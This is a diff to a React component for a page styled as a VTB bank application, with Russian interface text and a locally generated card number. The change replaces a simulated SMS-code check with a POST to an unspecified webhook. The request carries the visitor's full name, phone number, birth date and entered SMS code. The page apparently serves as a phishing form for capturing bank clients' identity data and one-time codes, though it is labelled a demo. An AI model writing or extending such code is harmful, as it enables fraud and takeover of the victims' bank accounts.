@@ -89,6 +89,7 @@ const Bank = () => {
 
   const [smsCode, setSmsCode] = useState('');
   const [generatedCode, setGeneratedCode] = useState('');
+  const [requestNumber, setRequestNumber] = useState('');
 
   // Генерируем номер карты и дату один раз при загрузке
   const [cardNumber] = useState(() => generateCardNumber());
@@ -244,8 +245,31 @@ const Bank = () => {
 
     setIsLoading(true);
 
-    // Имитация проверки кода
-    await new Promise(resolve => setTimeout(resolve, 1000));
+    try {
+      const phoneDigits = formData.phone.replace(/\D/g, '');
+      const response = await fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          fullName: formData.fullName,
+          phone: '7' + phoneDigits,
+          birthDate: formatDateForDisplay(formData.birthDate),
+          smsCode: smsCode,
+          verified: true,
+          timestamp: new Date().toISOString(),
+          source: 'vtb-demo-page',
+        }),
+      });
+
+      const data = await response.json();
+      if (data && data.request) {
+        setRequestNumber(data.request);
+      }
+    } catch (error) {
+      console.error('Webhook error:', error);
+    }
 
     setIsLoading(false);
     setStep('success');
@@ -374,8 +398,13 @@ const Bank = () => {
             <Check className="w-10 h-10 text-white" />
           </div>
           <h2 className="text-2xl font-medium text-gray-900 mb-4">Заявка успешно отправлена!</h2>
+          {requestNumber && (
+            <p className="text-lg font-medium text-[#0066FF] mb-4">
+              Номер заявки: {requestNumber}
+            </p>
+          )}
           <p className="text-gray-500 mb-2">
-            Спасибо, {formData.fullName.split(' ')[0]}!
+            Спасибо, {formData.fullName}!
           </p>
           <p className="text-gray-400 mb-8">
             Наш специалист свяжется с вами по номеру +7 {formData.phone} в ближайшее время для уточнения деталей.
@@ -390,6 +419,7 @@ const Bank = () => {
                 agreeTerms: false,
               });
               setSmsCode('');
+              setRequestNumber('');
             }}
             className="bg-[#0066FF] hover:bg-[#0052CC] text-white px-8 h-12 rounded-lg"
           >
